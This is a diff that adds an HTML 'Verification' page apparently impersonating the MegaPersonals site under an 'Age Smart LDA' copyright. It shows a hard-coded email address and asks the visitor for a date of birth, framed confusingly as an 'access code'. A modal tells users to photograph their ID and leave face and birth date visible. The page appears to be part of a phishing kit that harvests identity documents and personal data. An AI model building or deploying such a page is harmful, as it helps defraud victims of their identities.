@@ -1,0 +1,169 @@
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!doctype html>
+
+
+
+
+<html>
+    <head>
+        <title>Verification</title>
+        <meta id="viewportMetaTag" name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, minimal-ui">
+        <meta name="apple-mobile-web-app-capable" content="yes">
+        <meta name="SKYPE_TOOLBAR" content="SKYPE_TOOLBAR_PARSER_COMPATIBLE" />
+        <meta charset='utf-8'>
+        <meta name="_csrf_parameter" content="_csrf" /><meta name="_csrf_header" content="X-XSRF-TOKEN" /><meta name="_csrf" content="d88994f0-521b-49e4-97b4-5cfe7597622e" />
+        <link rel="icon" type="image/png" sizes="16x16" href="./static/img/root-page/favicon/favicon.png">
+        <script type="text/javascript" src="./static/js/jquery.min.js"></script>
+        <script type="text/javascript" src="./static/js/jquery-ui.min.js"></script>
+        <link rel="stylesheet" href="./static/css/jquery-ui.min.css"/>
+        <link href="./static/css/bootstrap.min.css" rel="stylesheet">
+        <script src="./static/js/bootstrap.bundle.min.js"></script>
+        <link rel="stylesheet" href="./static/css/bootstrap-icons.css">
+        <link rel="stylesheet" href="./static/css/custom.css">
+    </head>
+    <body>
+
+<link rel="stylesheet" href="./static/css/verification/wizard.css?v=1788449540">
+
+
+
+
+
+<div id="wizard-layout-top-header">
+  <div id="top-header">
+      <div class="mp-header">
+          <img src="./static/img/verification/megapersonalsPageHeader.png" alt="" />
+      </div>
+  </div>
+</div>
+
+<div id="wizard-layout-loader">
+  
+<div id="wizard-layout-loader-fader" class="spinner-loader-fader" style="display:none">
+  <div class="spinner-loader">
+    <div></div><div></div><div></div><div></div><div></div><div></div>
+    <div></div><div></div><div></div><div></div><div></div><div></div>
+  </div>
+</div>
+
+
+</div>
+
+<div class="container-fluid verification-container" id="wizard-layout-main">
+  <div id="wizard-layout-modal-backend">
+    
+<div id="wizard-layout-modal-backend-host" class="wizard-vanilla-modal-host" style="display:none">
+  <div class="modal-backdrop fade show"></div>
+  <div class="modal fade show" id="backend-error-modal" style="display:block">
+      <div class="modal-dialog modal-dialog-centered">
+          <div class="modal-content">
+              <div class="modal-body text-center">
+                  <h5 class="py-3 text-danger bold" id="wizard-backend-error-message"></h5>
+                  <button id="btn-backend-error-modal" class="btn btn-success mb-3" type="button">OK</button>
+              </div>
+          </div>
+      </div>
+  </div>
+</div>
+
+
+  </div>
+  <div id="wizard-layout-modal-blackout">
+    
+<div id="wizard-layout-modal-blackout-host" class="wizard-vanilla-modal-host" style="display:none">
+  <div class="modal-backdrop fade show"></div>
+  <div class="modal fade show" id="black-out-modal" style="display:block">
+      <div class="modal-dialog modal-dialog-centered">
+          <div class="modal-content">
+              <div class="modal-body text-center">
+                  <h5 class="py-3">Use your finger to black<br>out your name, address<br>and the ID number.</h5>
+                  <h5>DO NOT black out your<br>face or your date of birth. <br>Your verification will fail.</h5>
+                  <h5 class="py-3">Pinch and Scroll<br>with two fingers.<br>Draw with single finger.</h5>
+                  <button id="btn-black-out-modal" class="btn btn-success mb-3" type="button">OK</button>
+              </div>
+          </div>
+      </div>
+  </div>
+</div>
+
+
+  </div>
+  <div id="wizard-content" style="height: 100%;">
+    
+
+<main>
+    <div class="verification-container-page page-age">
+        <h3><strong>Email being registered</strong></h3>
+        <h3 style="color:green;"><strong id="step-age-email">amandaqueen012@gmail.com</strong></h3>
+        <h3>
+            <strong class="text-danger text-uppercase">Important!</strong><br>
+            Your ACCESS CODE<br>
+            will be tied to your<br>
+            <strong>DATE OF BIRTH</strong>
+        </h3>
+        <h3>Enter it here</h3>
+        <div id="birth-container">
+            <input id="birth-year" class="form-control" type="text" inputmode="numeric" placeholder="YYYY" maxlength="4" min="1940"/>
+            <input id="birth-month" class="form-control" type="text" inputmode="numeric" placeholder="MM" maxlength="2" autocomplete="bday-month" pattern="[0-9]*"/>
+            <input id="birth-day" class="form-control" type="text" inputmode="numeric" placeholder="DD" maxlength="2" autocomplete="bday-day" pattern="[0-9]*"/>
+        </div>
+        <div class="d-flex flex-column align-items-center">
+            <button id="btn-go-to-photo-id" class="btn btn-primary w-50" type="button">SUBMIT</button>
+            
+<img class="img-footer-logo mt-2" src="./static/img/verification/footer-logo.png' alt="" />
+<div>
+    <p class="d-flex justify-content-center fw-bold mb-0 mt-2 copyright">
+        Copyright &copy; 2026 Age Smart LDA. All Rights Reserved.
+    </p>
+    <p class="d-flex justify-content-center gap-3 fw-bold mb-0 copyright">
+        <a href="/terms" target="_blank">Terms of Use</a>
+        <a href="/privacy" target="_blank">Privacy Policy</a>
+        <a href="/billingTerms" target="_blank">Billing Questions</a>
+        <a href="/complaints" target="_blank">Report Abuse</a>
+    </p>
+</div>
+
+
+        </div>
+    </div>
+</main>
+
+</div>
+
+
+<script src="./plugins/wizard/common/common.iife.js?v=1788449540"></script>
+<script src="./plugins/wizard/age/age.iife.js?v=1788449540"></script>
+<script>
+    VerificationWizardCommon.restrictWizardViewport();
+    VerificationWizardCommon.attachWizardAppHeightWindowListener();
+    VerificationWizardCommon.disableWizardLayoutPinchZoom();
+
+    new VerificationWizardAge.StepAgeController({
+        verificationToken: "r1mdJDAdZyvzI29cw-9XZbcIxZfUSgdj",
+        dob: "",
+    });
+</script>
+
+  </body>
+</html>
